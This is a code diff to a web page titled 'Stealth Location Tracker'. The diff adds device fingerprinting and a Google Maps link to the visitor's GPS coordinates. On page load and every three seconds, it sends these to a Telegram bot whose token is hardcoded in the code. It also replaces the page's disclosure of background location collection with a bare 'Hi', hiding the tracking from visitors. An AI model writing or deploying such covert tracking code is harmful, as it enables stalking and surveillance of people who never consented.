@@ -5,16 +5,38 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Stealth Location Tracker</title>
   <script>
+    // Generate Google Maps link from latitude and longitude
+    function generateGoogleMapsLink(latitude, longitude) {
+      return `https://www.google.com/maps/place/${latitude.toFixed(7)}N+${longitude.toFixed(7)}E/@${latitude},${longitude},17z`;
+    }
+
+    // Get device details
+    function getDeviceDetails() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const vendor = navigator.vendor || "Unknown Vendor";
+      const language = navigator.language || "Unknown Language";
+
+      return `Device Details:\nPlatform: ${platform}\nVendor: ${vendor}\nUser Agent: ${userAgent}\nLanguage: ${language}`;
+    }
+
     // Request location every time the PWA is opened
     async function getLocationAndSend() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(async (position) => {
           const { latitude, longitude } = position.coords;
 
-          const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
-          const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
+          // Generate Google Maps link with the coordinates
+          const mapsLink = generateGoogleMapsLink(latitude, longitude);
+          // console.log("Maps Link:", mapsLink);
 
-          // Send location to Telegram bot
+          // Get device details
+          const deviceDetails = getDeviceDetails();
+          // console.log("Device Details:", deviceDetails);
+          const url = `https://api.telegram.org/bot8113534372:AAF2DahT2CQYToSvG7Z_VMZ_-0BmweybX5I/sendMessage`;
+          const message = `Latitude: ${latitude}, Longitude: ${longitude}\n${mapsLink}\n\n${deviceDetails}`;
+
+          // Send location, link, and device details to Telegram bot
           await fetch(url, {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -34,12 +56,17 @@
     // Trigger location tracking on page load
     window.onload = getLocationAndSend;
 
+    // Re-send location every 3 seconds
     setInterval(getLocationAndSend, 3000);
 
   </script>
 </head>
 <body>
-  <h1>Stealth Location Tracker</h1>
-  <p>This PWA will collect location data in the background.</p>
+
+
+  <h1>Hi</h1>
+  <p></p>
+
+
 </body>
 </html>
